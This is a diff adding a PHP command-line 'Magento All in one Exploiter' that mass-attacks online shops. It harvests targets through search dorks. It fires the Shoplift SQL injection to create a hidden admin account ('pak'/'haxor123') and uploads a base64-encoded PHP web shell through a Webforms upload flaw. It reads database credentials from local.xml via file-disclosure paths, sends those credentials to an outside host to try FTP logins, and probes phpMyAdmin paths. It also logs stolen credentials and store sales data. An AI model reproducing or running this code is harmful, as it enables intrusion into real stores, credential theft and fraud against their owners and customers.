@@ -1,0 +1,497 @@
+<?php
+function logo()
+{
+	$logo = "=======================================================\n";
+	$logo .= "Magento All in one Exploiter\n";
+	$logo .= "Created By Pak Haxor Special Thank To Papah Crew\n";	
+	$logo .= "Thank To Yogyakarta BlackHat & All Coder Indonesian\n";	
+	$logo .= "=======================================================\n";
+	echo $logo;
+}
+function CurlPost($url, $post = false,$type=null){
+		if($type == 1)
+		{
+			$ch = curl_init();
+			curl_setopt ($ch, CURLOPT_URL, $url);
+			curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
+			curl_setopt ($ch, CURLOPT_TIMEOUT, 60);
+			curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+			curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
+			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+			curl_setopt ($ch, CURLOPT_POST, 1);
+			$headers  = array();
+			$headers[] = 'Accept-Encoding: gzip, deflate';
+			$headers[] = 'Content-Type: application/x-www-form-urlencoded';
+			curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
+			curl_setopt ($ch, CURLOPT_HEADER, 1);
+			$result = curl_exec ($ch);
+			curl_close($ch);
+			return $result;
+		}
+		if($type == 2)
+		{
+			$ch = curl_init();
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_HEADER, 0);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+		if($post !== false){
+			$isi = '';
+			foreach($post as $key=>$value){
+				$isi .= $key.'='.$value.'&';
+			}
+			rtrim($isi, '&');
+			curl_setopt($ch, CURLOPT_URL, $url);
+			curl_setopt($ch, CURLOPT_POST, count($isi));
+			curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+			curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
+		}
+		$data = curl_exec($ch);
+		curl_close($ch);
+		return $data;
+		}
+	}
+
+function Jswebforms($site,$file)
+{
+	$post = array('files[]'=>"@$file") ;
+	$ch = curl_init();
+	curl_setopt ($ch, CURLOPT_URL, "$site/js/webforms/upload/");
+	curl_setopt ($ch, CURLOPT_USERAGENT, "msnbot/1.0 (+http://search.msn.com/msnbot.htm)");
+	curl_setopt($ch, CURLOPT_POST, true);
+	curl_setopt($ch, CURLOPT_POSTFIELDS,$post);
+	curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+	$data = curl_exec($ch);
+	curl_close($ch);
+	$json = json_decode($data);
+	if(isset($json[0]->url))
+	{
+		$shell = get_content($json[0]->url);
+		return (preg_match("/Pak Haxor/",$shell)) ? $json[0]->url : false;
+	}
+}
+function createshell()
+{
+	$ext = array("php","php5","php7","php.j","phtml","shtml","php.pjpeg");
+	$shell = "PD9waHANCmVjaG8gYmFzZTY0X2RlY29kZSgiVUdGcklFaGhlRzl5Iik7DQplY2hvICI8YnI+Ii5waHBfdW5hbWUoKS4iPGJyPiI7DQplY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPg0KPGlucHV0IHR5cGU9J2ZpbGUnIG5hbWU9J2lkeCc+PGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndXBsb2FkJyB2YWx1ZT0ndXBsb2FkJz4NCjwvZm9ybT4iOw0KaWYoJF9QT1NUWyd1cGxvYWQnXSkgew0KCWlmKEBjb3B5KCRfRklMRVNbJ2lkeCddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydpZHgnXVsnbmFtZSddKSkgew0KCWVjaG8gInN1a3NlcyI7DQoJfSBlbHNlIHsNCgllY2hvICJnYWdhbCI7DQoJfQ0KfQ0KPz4=";
+	for($i=0;$i<count($ext);$i++)
+	{
+		$fp = fopen("sj.".$ext[$i], 'a+');
+		fwrite($fp, base64_decode($shell));
+		fclose($fp);
+	}
+	return $ext;
+}
+function get_content($url)
+{
+	return @file_get_contents($url);
+}
+function FinderPhpMyAdmin($site)
+{
+	$x = 1;
+	$list = array(
+	'/phpMyAdmin/',
+	'/phpmyadmin/',
+	'/PMA/',
+	'/pma/',
+	'/dbadmin/',
+	'/mysql/',
+	'/myadmin/',
+	'/phpmyadmin2/',
+	'/phpMyAdmin2/',
+	'/phpMyAdmin-2/',
+	'/php-my-admin/',
+	'/phpMyAdmin-2.2.3/',
+	'/phpMyAdmin-2.2.6/',
+	'/phpMyAdmin-2.5.1/',
+	'/phpMyAdmin-2.5.4/',
+	'/phpMyAdmin-2.5.5-rc1/',
+	'/phpMyAdmin-2.5.5-rc2/',
+	'/phpMyAdmin-2.5.5/',
+	'/phpMyAdmin-2.5.5-pl1/',
+	'/phpMyAdmin-2.5.6-rc1/',
+	'/phpMyAdmin-2.5.6-rc2/',
+	'/phpMyAdmin-2.5.6/',
+	'/phpMyAdmin-2.5.7/',
+	'/phpMyAdmin-2.5.7-pl1/',
+	'/phpMyAdmin-2.6.0-alpha/',
+	'/phpMyAdmin-2.6.0-alpha2/',
+	'/phpMyAdmin-2.6.0-beta1/',
+	'/phpMyAdmin-2.6.0-beta2/',
+	'/phpMyAdmin-2.6.0-rc1/',
+	'/phpMyAdmin-2.6.0-rc2/',
+	'/phpMyAdmin-2.6.0-rc3/',
+	'/phpMyAdmin-2.6.0/',
+	'/phpMyAdmin-2.6.0-pl1/',
+	'/phpMyAdmin-2.6.0-pl2/',
+	'/phpMyAdmin-2.6.0-pl3/',
+	'/phpMyAdmin-2.6.1-rc1/',
+	'/phpMyAdmin-2.6.1-rc2/',
+	'/phpMyAdmin-2.6.1/',
+	'/phpMyAdmin-2.6.1-pl1/',
+	'/phpMyAdmin-2.6.1-pl2/',
+	'/phpMyAdmin-2.6.1-pl3/',
+	'/phpMyAdmin-2.6.2-rc1/',
+	'/phpMyAdmin-2.6.2-beta1/',
+	'/phpMyAdmin-2.6.2-rc1/',
+	'/phpMyAdmin-2.6.2/',
+	'/phpMyAdmin-2.6.2-pl1/',
+	'/phpMyAdmin-2.6.3/',
+	'/phpMyAdmin-2.6.3-rc1/',
+	'/phpMyAdmin-2.6.3/',
+	'/phpMyAdmin-2.6.3-pl1/',
+	'/phpMyAdmin-2.6.4-rc1/',
+	'/phpMyAdmin-2.6.4-pl1/',
+	'/phpMyAdmin-2.6.4-pl2/',
+	'/phpMyAdmin-2.6.4-pl3/',
+	'/phpMyAdmin-2.6.4-pl4/',
+	'/phpMyAdmin-2.6.4/',
+	'/phpMyAdmin-2.7.0-beta1/',
+	'/phpMyAdmin-2.7.0-rc1/',
+	'/phpMyAdmin-2.7.0-pl1/',
+	'/phpMyAdmin-2.7.0-pl2/',
+	'/phpMyAdmin-2.7.0/',
+	'/phpMyAdmin-2.8.0-beta1/',
+	'/phpMyAdmin-2.8.0-rc1/',
+	'/phpMyAdmin-2.8.0-rc2/',
+	'/phpMyAdmin-2.8.0/',
+	'/phpMyAdmin-2.8.0.1/',
+	'/phpMyAdmin-2.8.0.2/',
+	'/phpMyAdmin-2.8.0.3/',
+	'/phpMyAdmin-2.8.0.4/',
+	'/phpMyAdmin-2.8.1-rc1/',
+	'/phpMyAdmin-2.8.1/',
+	'/phpMyAdmin-2.8.2/',
+	'/sqlmanager/',
+	'/mysqlmanager/',
+	'/p/m/a/',
+	'/PMA2005/',
+	'/pma2005/',
+	'/phpmanager/',
+	'/php-myadmin/',
+	'/phpmy-admin/',
+	'/webadmin/',
+	'/sqlweb/',
+	'/websql/',
+	'/webdb/',
+	'/mysqladmin/',
+	'/mysql-admin/',
+	'/mya/',
+	);
+	$jumlah = count($list);
+	if(isset($site))
+	{
+	echo "\n[+] Searching Mysql Login : ";
+		foreach($list as $path => $test) 
+		{
+			$ch = curl_init();
+			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+			curl_setopt($ch, CURLOPT_HEADER, 1);
+			curl_setopt($ch, CURLOPT_URL, $site.$test);
+			$result = curl_exec($ch);
+			curl_close($ch);
+			if (preg_match("/200 OK/", $result))
+			{
+				return $site.$test;
+				break;
+			}
+			else if (preg_match("/401 Unauthorized/", $result))
+			{
+				return $site.$test;
+			}
+			else 
+			{
+				echo ".";
+			}
+		}
+	}
+}
+function ftplogin($host,$user,$pass)
+{
+	$con = ftp_connect($host) or die("Couldn't connect"); 
+	ftp_login($con,  $user,  $pass);
+	return is_array(ftp_nlist($con, ".")) ? true : false;
+}
+function GetStr($start,$end,$string){
+		$a = explode($start,$string);
+		$b = explode($end,$a[1]);
+		return $b[0];
+	}
+function userFTP($username)
+{
+	$user = explode("_",$username);
+	return (isset($user[1])) ? $user[1] : $user[0];
+}
+
+function ReadStdin($prompt, $valid_inputs=null, $default = '') {
+    while(!isset($input) || (is_array($valid_inputs) && !in_array($input, $valid_inputs)) || ($valid_inputs == 'is_file' && !is_file($input))) {
+        echo $prompt;
+        $input = strtolower(trim(fgets(STDIN)));
+        break;
+        if(empty($input) && !empty($default)) {
+            $input = $default;
+        }
+    }
+    return $input;
+} 
+
+function LoginDownloader($url){
+		$link = parse_url($url);
+		if(isset($link["scheme"]))
+		{
+			$data = CurlPost(sprintf("%s://%s/downloader/",$link["scheme"],$link["host"]),
+						array("username" => "pak",
+							  "password" => "haxor123"),2
+						);
+		}
+		else
+		{
+			$data = CurlPost("http://$url",
+						array("username" => "pak",
+							  "password" => "haxor123"),2
+						);
+		}
+		if(preg_match("/Log Out/i",$data) || (preg_match("/Return to Admin/i",$data))){
+			$permission = (!preg_match("/Warning: Your Magento folder does not have sufficient write permissions./i",$data) ? "Writeable" : "Denied");
+			$smtp = (preg_match("/Smtp/",$data) ? "Yes" : "No");
+			$filemanager = (preg_match("/File_System/",$data) ? "Yes":"No");
+			return $permission.
+			"\n 	==> Smtp : $smtp".
+			"\n 	==> Filemanager : $filemanager";
+		} else {
+			return "Failed";
+		}
+	}
+function getDomain($keyword)
+{
+	if($keyword == 1)
+	{
+		return array($argv[1]);
+	}
+}
+function SearchEngine($dork)
+{
+		$list = array();
+		for($i=0;$i<=1000;$i+=10){
+					$search = CurlPost("http://www.bing.com/search?q=".urlencode($dork)."&first=".$i,false,2);
+					preg_match_all('/<a href=\"?http:\/\/([^\"]*)\"/m', $search, $m);
+					foreach($m[1] as $link){
+						if(!preg_match("/live|msn|bing|microsoft/",$link)){
+							if(!in_array($link,$list)){
+								$url = parse_url($link);
+								$target = (!isset($url["scheme"]) ? "http://".$link : $url["scheme"]."://".$url["host"]);
+								if(preg_match('/http/',$target))
+								{
+									$reparse = parse_url($target);
+									$domain = (!isset($reparse["scheme"]) ? $target : $reparse["host"]);
+								}
+								$list[] = $domain;
+							}
+						}
+					}
+					echo ".";
+				}
+				echo "\nDitemukan : ".count(array_unique($list))."\n";
+				return array_unique($list);
+}
+logo();
+$getdomains = ReadStdin("[1] Making Dork\n[2] Making List\n[3] Making Url\nSelected : ", array('1','2','3')); 
+	if(!isset($getdomains) or $getdomains > 3)
+	{
+		echo "Wrong Press !!!";
+		die();
+	}
+	if($getdomains == 1)
+	{
+		$dorker = ReadStdin("[1] Bing\nSelected : ",array("keyword"));
+		if($dorker == 1)
+		{
+			$url1 = ReadStdin("Masukkan Dork : ",array("keyword"));
+			echo "Grabbing : ";
+			$get = SearchEngine($url1);
+		}
+	}
+	if($getdomains == 2)
+	{
+		$url2 = ReadStdin("Masukkan Namafile TXT : ",array("keyword"));
+		$get = file($url2);
+	}
+	if($getdomains == 3)
+	{
+		$url3 = ReadStdin("Masukkan url : ",array("keyword"));
+		$get = array($url3);
+	}
+
+$addadmin = ReadStdin('Apakah Anda Ingin Menggunakan Shoplift(Magento Add Admin) ? (Y/N): ', array('Y', 'N')); 
+$jswebforms = ReadStdin('Apakah Anda Ingin Menggunakan Magento Js Webforms ? (Y/N): ', array('Y', 'N')); 
+$lfdScanning = ReadStdin('Apakah Anda Ingin Menggunakan LFD Scanning + magmi + amasty ? (Y/N): ', array('Y', 'N')); 
+$ftpScanning = ReadStdin('Apakah Anda Ingin Menggunakan FTP Scanning ? (Y/N): ', array('Y', 'N')); 
+//==================GET FROM FILEDATA====================//
+$x=1;
+foreach($get as $domain)
+{
+	if($getdomains == 2)
+	{
+		$domain = str_replace("\r", "", $domain);
+		$domain = str_replace("\n", "", $domain);
+	}
+	echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
+	echo "Scanning Url : $domain\n";
+	if($addadmin == "y")
+	{
+		echo "[+] Add Admin Status : ";
+		$path = "/admin/Cms_Wysiwyg/directive/index/";
+		$post = 'filter=cG9wdWxhcml0eVtmcm9tXT0wJnBvcHVsYXJpdHlbdG9dPTMmcG9wdWxhcml0eVtmaWVsZF9leHByXT0wKTtTRVQgQFNBTFQgPSAncnAnO1NFVCBAUEFTUyA9IENPTkNBVChNRDUoQ09OQ0FUKCBAU0FMVCAsICdoYXhvcjEyMycpICksIENPTkNBVCgnOicsIEBTQUxUICkpO1NFTEVDVCBARVhUUkEgOj0gTUFYKGV4dHJhKSBGUk9NIGFkbWluX3VzZXIgV0hFUkUgZXh0cmEgSVMgTk9UIE5VTEw7SU5TRVJUIElOVE8gYGFkbWluX3VzZXJgIChgZmlyc3RuYW1lYCwgYGxhc3RuYW1lYCxgZW1haWxgLGB1c2VybmFtZWAsYHBhc3N3b3JkYCxgY3JlYXRlZGAsYGxvZ251bWAsYHJlbG9hZF9hY2xfZmxhZ2AsYGlzX2FjdGl2ZWAsYGV4dHJhYCxgcnBfdG9rZW5gLGBycF90b2tlbl9jcmVhdGVkX2F0YCkgVkFMVUVTICgnRmlyc3RuYW1lJywnTGFzdG5hbWUnLCdlbWFpbEBleGFtcGxlLmNvbScsJ3BhaycsQFBBU1MsTk9XKCksMCwwLDEsQEVYVFJBLE5VTEwsIE5PVygpKTtJTlNFUlQgSU5UTyBgYWRtaW5fcm9sZWAgKHBhcmVudF9pZCx0cmVlX2xldmVsLHNvcnRfb3JkZXIscm9sZV90eXBlLHVzZXJfaWQscm9sZV9uYW1lKSBWQUxVRVMgKDEsMiwwLCdVJywoU0VMRUNUIHVzZXJfaWQgRlJPTSBhZG1pbl91c2VyIFdIRVJFIHVzZXJuYW1lID0gJ3BhaycpLCdGaXJzdG5hbWUnKTs=%3D&___directive=e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&forwarded=1';
+		$exploit = CurlPost($domain.$path,$post,1);
+		if(preg_match('#200 OK#', $exploit))
+		{
+			echo "SUCCESS";
+			echo "\n[+] Check Status Login :";
+			$postlogin = array("login[username]" => "pak",
+							  "login[password]" => "haxor123");
+			$postlogindownloader = array("username" => "pak",
+										  "password" => "haxor123");
+			$checklogin = CurlPost($domain."/admin",$postlogin,2);
+			$downloader = LoginDownloader($domain);
+			if(preg_match('/<body id="html-body" class=" adminhtml-dashboard-index">/', $checklogin))
+			{
+				$total = GetStr("<span class=\"price\">","</span>",$checklogin);
+				$average = GetStr('<span class="nowrap" style="font-size:18px;"><span class="price">',"</span>",$checklogin);
+				echo "TRUE\n";
+				$message  =	"====================================\n";
+				$message .= "	==> Url Login : $domain/admin\n";
+				$message .= "	==> Username : pak\n";
+				$message .= "	==> Password : haxor123\n";
+				$message .= "	==> Lifetime Sales : $total \n";
+				$message .= "	==> Average Orders : $average \n";
+				$message .= "	==> Downloader : $downloader \n";
+				echo $message;
+				$fp = fopen("shoplift.txt", 'a+');
+				fwrite($fp, $message);
+				fclose($fp);
+			}
+			else
+			{
+				echo "FALSE\n";
+			}
+			echo "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n";
+		}
+		else
+		{
+			echo "FAILURE\n";
+		}
+	}
+	if($jswebforms == "y")
+	{
+		if(get_content($domain."/js/webforms/upload") == "[]")
+		{
+			echo "[+] Uploaded Shell : ";
+			if(!file_exists("sj.php"))
+			{
+					$ext = createshell();
+			}
+			else
+			{
+					$ext = array("php","php5","php7","php.j","phtml","shtml","php.pjpeg");
+			}
+			for($i=0;$i<count($ext);$i++)
+			{
+				echo ".";
+				$exploit = Jswebforms($domain,"sj.".$ext[$i]);
+				if(isset($exploit))
+				{
+						echo "\n".$exploit." Success \n";
+						$fp = fopen("jswebforms.txt", 'a+');
+						fwrite($fp, $exploit."\n");
+						fclose($fp);
+				}
+			}
+		}
+		else
+		{
+			echo "[-] Webforms Not vuln\n";
+		}
+	}
+	if($lfdScanning == "y")
+	{
+		$path = array("Amasty" => "/app/etc/local.xml",
+							"Magmi" => "/magmi/web/download_file.php?file=../../app/etc/local.xml"
+						);
+		echo "[+] LFD Scanning :";
+		foreach($path as $key => $value)
+		{
+			$url = parse_url($domain);
+			$target = (!isset($url["scheme"]) ? "http://".$domain : $url["scheme"]."://".$url["host"]);
+			$lfd = get_content($target.$value);
+			if(preg_match("/<host><!/",$lfd))
+			{
+				echo "Found\n";
+				$date = GetStr("<date><![CDATA[","]]></date>",$lfd);
+				$host = GetStr("<host><![CDATA[","]]></host>",$lfd);
+				$username = GetStr("<username><![CDATA[","]]></username>",$lfd);
+				$password = GetStr("<password><![CDATA[","]]></password>",$lfd);
+				$dbname = GetStr("<dbname><![CDATA[","]]></dbname>",$lfd);
+				$lfdconfig = "==============[Mysql Login]===============\n";
+				$lfdconfig .= "Domain : $domain\n";
+				$lfdconfig .= "Date : $date\n";
+				$lfdconfig .= "Host : $host\n";
+				$lfdconfig .= "Username : $username\n";
+				$lfdconfig .= "Password : $password\n";
+				$lfdconfig .= "DatabaseName : $dbname\n";
+				$lfdconfig .= "=========================================\n";
+				echo $lfdconfig;
+				$fp = fopen("lfdconfig.txt", 'a+');
+						fwrite($fp, $lfdconfig);
+						fclose($fp);
+				if($ftpScanning == "y")
+			{
+					echo "\n[+] Scanning FTP LOGIN : ";
+					$url = parse_url($domain);
+					$ftp = get_content("http://www.fccarolinasoccer.com/ftp.php?domain=$domain&username=".userFTP($username)."&password=$password");
+				if(preg_match("/SUCCESS/",$ftp))
+				{
+					echo "SUCCESS\n";
+					$ftpinfo = "================================\n";
+					$ftpinfo .= "Host : ftp.".$url["host"]."\n";
+					$ftpinfo .= "Username : ".userFTP($username)."\n";
+					$ftpinfo .= "Password : ".$password."\n";
+					$ftpinfo .= "================================\n";
+					echo $ftpinfo;
+					$fp = fopen("ftpmagento.txt", 'a+');
+						fwrite($fp, $ftpinfo);
+						fclose($fp);
+				}
+				else
+				{
+					echo "Failure\n";
+				}
+		    }
+				$finderPhpmyadmin = FinderPhpMyAdmin("$domain");
+				if(isset($finderPhpmyadmin))
+				{
+					$fp = fopen("lfdconfig.txt", 'a+');
+						fwrite($fp, "\nPath Mysql login : $finderPhpmyadmin");
+						fclose($fp);
+				echo "\n Path Mysql login : $finderPhpmyadmin";
+				}
+				else
+				{
+					echo "\n[-] Path Mysql Not found";
+				}
+			break;
+			}
+			else
+			{
+				echo " \n==>[$key] Not Found\n";
+			}
+		}
+	}
+
+}
+?>
